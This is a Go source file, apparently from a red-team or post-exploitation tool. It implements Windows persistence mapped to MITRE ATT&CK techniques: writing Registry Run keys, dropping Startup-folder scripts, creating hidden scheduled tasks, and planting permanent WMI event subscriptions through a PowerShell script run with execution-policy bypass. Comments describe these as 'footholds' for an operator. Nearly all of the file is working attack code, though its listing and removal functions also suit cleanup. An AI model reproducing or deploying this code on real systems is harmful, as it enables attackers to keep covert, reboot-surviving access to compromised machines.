//go:build windows

package persist

import (
	"encoding/csv"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"

	"golang.org/x/sys/windows/registry"
)

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`

// ---------------------------------------------------------------------------
// Registry Run keys (T1547.001) + Startup folder (T1547.009)
// ---------------------------------------------------------------------------

func openRunKey(h Hive, write bool) (registry.Key, error) {
	var root registry.Key
	var access uint32 = registry.QUERY_VALUE | registry.ENUMERATE_SUB_KEYS
	switch h {
	case HKCU:
		root = registry.CURRENT_USER
	case HKLM:
		root = registry.LOCAL_MACHINE
	default:
		return 0, fmt.Errorf("persist: unknown hive %q (HKCU/HKLM)", h)
	}
	if write {
		access |= registry.SET_VALUE | registry.CREATE_SUB_KEY
	}
	return registry.OpenKey(root, runKeyPath, access)
}

// listRun returns the values of both Run keys (HKLM's key is world-readable).
func listRun() []Entry {
	var out []Entry
	for _, h := range []Hive{HKCU, HKLM} {
		k, err := openRunKey(h, false)
		if err != nil {
			continue // unreadable policy key — skip, do not fail the listing
		}
		names, err := k.ReadValueNames(-1)
		k.Close()
		if err != nil {
			continue
		}
		for _, n := range names {
			k, err := openRunKey(h, false)
			if err != nil {
				continue
			}
			v, _, err := k.GetStringValue(n)
			k.Close()
			if err != nil {
				continue
			}
			out = append(out, Entry{Type: TypeRun, Hive: string(h), Name: n, Command: v})
		}
	}
	return out
}

func listStartup() []Entry {
	dir, err := startupDir()
	if err != nil {
		return nil
	}
	fis, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []Entry
	for _, fi := range fis {
		if fi.IsDir() {
			continue
		}
		ext := strings.ToLower(filepath.Ext(fi.Name()))
		if ext != ".cmd" && ext != ".bat" && ext != ".lnk" && ext != ".exe" {
			continue
		}
		out = append(out, Entry{
			Type:    TypeStartup,
			Hive:    "Startup",
			Name:    strings.TrimSuffix(fi.Name(), ext),
			Command: filepath.Join(dir, fi.Name()),
		})
	}
	return out
}

// addRun writes the foothold. HKCU needs no elevation; HKLM Run does.
func addRun(h Hive, name, cmd string) error {
	k, err := openRunKey(h, true)
	if err != nil {
		return fmt.Errorf("persist: open %s\\Run for write: %v (HKLM needs an elevated token)", h, err)
	}
	defer k.Close()
	if err := k.SetStringValue(name, cmd); err != nil {
		return fmt.Errorf("persist: set %s value: %w", name, err)
	}
	return nil
}

func removeRun(h Hive, name string) error {
	k, err := openRunKey(h, true)
	if err != nil {
		return err
	}
	defer k.Close()
	_ = k.DeleteValue(name) // idempotent: a missing value is success
	return nil
}

func addStartup(name, cmd string) error {
	dir, err := startupDir()
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	return os.WriteFile(filepath.Join(dir, name+".cmd"), []byte(shimContent(cmd)), 0o644)
}

func removeStartup(name string) error {
	dir, err := startupDir()
	if err != nil {
		return err
	}
	for _, ext := range []string{".cmd", ".bat", ".lnk"} {
		_ = os.Remove(filepath.Join(dir, name+ext)) // idempotent
	}
	return nil
}

// ---------------------------------------------------------------------------
// Scheduled tasks (T1053.005)
// ---------------------------------------------------------------------------
//
// schtasks.exe is used instead of the Task Scheduler COM interface: the COM
// route (ITaskService) needs a full IDispatch implementation and a large
// dependency, while schtasks is present on every supported Windows and speaks
// a stable CLI. The child window is hidden so no console flashes.

const taskPrefix = "OBL_"

// runHidden runs a child process with no visible window and returns its
// combined output.
func runHidden(name string, args ...string) ([]byte, error) {
	cmd := exec.Command(name, args...)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.CombinedOutput()
}

func addTask(name, command, schedule, startTime string) error {
	sch := strings.ToUpper(strings.TrimSpace(schedule))
	if sch == "" {
		sch = "ONLOGON"
	}
	switch sch {
	case "ONLOGON", "ONSTART", "ONCE":
	default:
		return fmt.Errorf("persist: task schedule %q unsupported (ONLOGON/ONSTART/ONCE)", schedule)
	}
	args := []string{"/Create", "/TN", taskPrefix + name, "/TR", command, "/SC", sch, "/F"}
	if sch == "ONCE" {
		if strings.TrimSpace(startTime) == "" {
			return fmt.Errorf("persist: ONCE schedule needs a start time (HH:MM)")
		}
		args = append(args, "/ST", strings.TrimSpace(startTime))
	}
	out, err := runHidden("schtasks", args...)
	if err != nil {
		return fmt.Errorf("persist: schtasks create %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

func removeTask(name string) error {
	out, err := runHidden("schtasks", "/Delete", "/TN", taskPrefix+name, "/F")
	if err != nil {
		return fmt.Errorf("persist: schtasks delete %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

// listTasks parses `schtasks /Query /V /FO CSV /NH`. The column ORDER is
// stable across locales even though the header text is localised: column 0 is
// TaskName and column 7 is "Task To Run". Microsoft's own tasks are skipped.
func listTasks() []Entry {
	out, err := runHidden("schtasks", "/Query", "/FO", "CSV", "/V", "/NH")
	if err != nil {
		return nil
	}
	return parseTasksCSV(out)
}

// parseTasksCSV turns schtasks CSV output into entries (pure, so it is unit
// tested without invoking the scheduler).
func parseTasksCSV(out []byte) []Entry {
	rows, err := csv.NewReader(strings.NewReader(string(out))).ReadAll()
	if err != nil {
		return nil
	}
	var res []Entry
	for _, r := range rows {
		if len(r) < 8 {
			continue
		}
		taskName := strings.TrimSpace(r[0])
		toRun := strings.TrimSpace(r[7]) // "Task To Run"
		if taskName == "" || toRun == "" {
			continue
		}
		if strings.Contains(strings.ToLower(taskName), `\microsoft\`) {
			continue // built-in OS tasks — not operator footholds
		}
		taskName = strings.TrimPrefix(taskName, `\`)
		res = append(res, Entry{Type: TypeTask, Hive: "TaskScheduler", Name: taskName, Command: toRun})
	}
	return res
}

// ---------------------------------------------------------------------------
// WMI event subscriptions (T1546.003)
// ---------------------------------------------------------------------------
//
// A permanent WMI subscription is a three-object graph in root\subscription:
// an __EventFilter (the trigger), a CommandLineEventConsumer (the payload) and
// a __FilterToConsumerBinding. The native route is DCOM/IDispatch; PowerShell's
// WMI cmdlets drive it in one process, so this module generates a short script
// instead of embedding a COM client. All interpolated values are single-quoted
// in the script with quotes doubled — a name can never break out of its
// literal.

const wmiNamePrefix = "OBL_"

func psRun(script string) ([]byte, error) {
	return runHidden("powershell", "-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script)
}

// psQuote single-quotes a value for PowerShell, doubling embedded quotes.
func psQuote(s string) string { return "'" + strings.ReplaceAll(s, "'", "''") + "'" }

func addWMI(name, command string) error {
	consumer := wmiNamePrefix + name
	script := `$ErrorActionPreference='Stop';` +
		`$ns='root\subscription';` +
		`$q="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 180";` +
		`$f=Set-WmiInstance -Namespace $ns -Class __EventFilter -Arguments @{Name=` + psQuote(consumer) + `; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$q};` +
		`$c=Set-WmiInstance -Namespace $ns -Class CommandLineEventConsumer -Arguments @{Name=` + psQuote(consumer) + `; CommandLineTemplate=` + psQuote(command) + `};` +
		`Set-WmiInstance -Namespace $ns -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c};` +
		`Write-Output 'OK'`
	out, err := psRun(script)
	if err != nil {
		return fmt.Errorf("persist: WMI subscription %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

// removeWMI removes the filter, consumer and binding by consumer name. The
// name is taken verbatim (not re-prefixed) so a foreign consumer listed by
// listWMI can be cleaned up too.
func removeWMI(name string) error {
	q := psQuote(name)
	script := `$ErrorActionPreference='SilentlyContinue';` +
		`$ns='root\subscription';` +
		`Get-WmiObject -Namespace $ns -Class __FilterToConsumerBinding | Where-Object { $_.Filter -like ('*' + ` + q + ` + '*') -or $_.Consumer -like ('*' + ` + q + ` + '*') } | Remove-WmiObject;` +
		`Get-WmiObject -Namespace $ns -Class __EventFilter -Filter ("Name=" + ` + q + `) | Remove-WmiObject;` +
		`Get-WmiObject -Namespace $ns -Class CommandLineEventConsumer -Filter ("Name=" + ` + q + `) | Remove-WmiObject;` +
		`Write-Output 'OK'`
	out, err := psRun(script)
	if err != nil {
		return fmt.Errorf("persist: WMI removal %q: %v: %s", name, err, firstLine(out))
	}
	return nil
}

// listWMI enumerates every CommandLineEventConsumer in root\subscription,
// emitting "Name|CommandLineTemplate" per line.
func listWMI() []Entry {
	script := `$ErrorActionPreference='SilentlyContinue';` +
		`Get-WmiObject -Namespace 'root\subscription' -Class CommandLineEventConsumer | ` +
		`ForEach-Object { $_.Name + '|' + $_.CommandLineTemplate }`
	out, err := psRun(script)
	if err != nil {
		return nil
	}
	return parseWMIConsumers(out)
}

// parseWMIConsumers turns the "Name|CommandLineTemplate" stream into entries
// (pure, so it is unit tested without invoking PowerShell).
func parseWMIConsumers(out []byte) []Entry {
	var res []Entry
	for _, line := range strings.Split(string(out), "\n") {
		line = strings.TrimRight(line, "\r")
		if strings.TrimSpace(line) == "" {
			continue
		}
		name, cmd, _ := strings.Cut(line, "|")
		name = strings.TrimSpace(name)
		if name == "" {
			continue
		}
		res = append(res, Entry{Type: TypeWMI, Hive: "WMI", Name: name, Command: strings.TrimSpace(cmd)})
	}
	return res
}

// firstLine keeps an error message to a single line for the console.
func firstLine(b []byte) string {
	s := strings.TrimSpace(string(b))
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = s[:i]
	}
	return strings.TrimSpace(s)
}
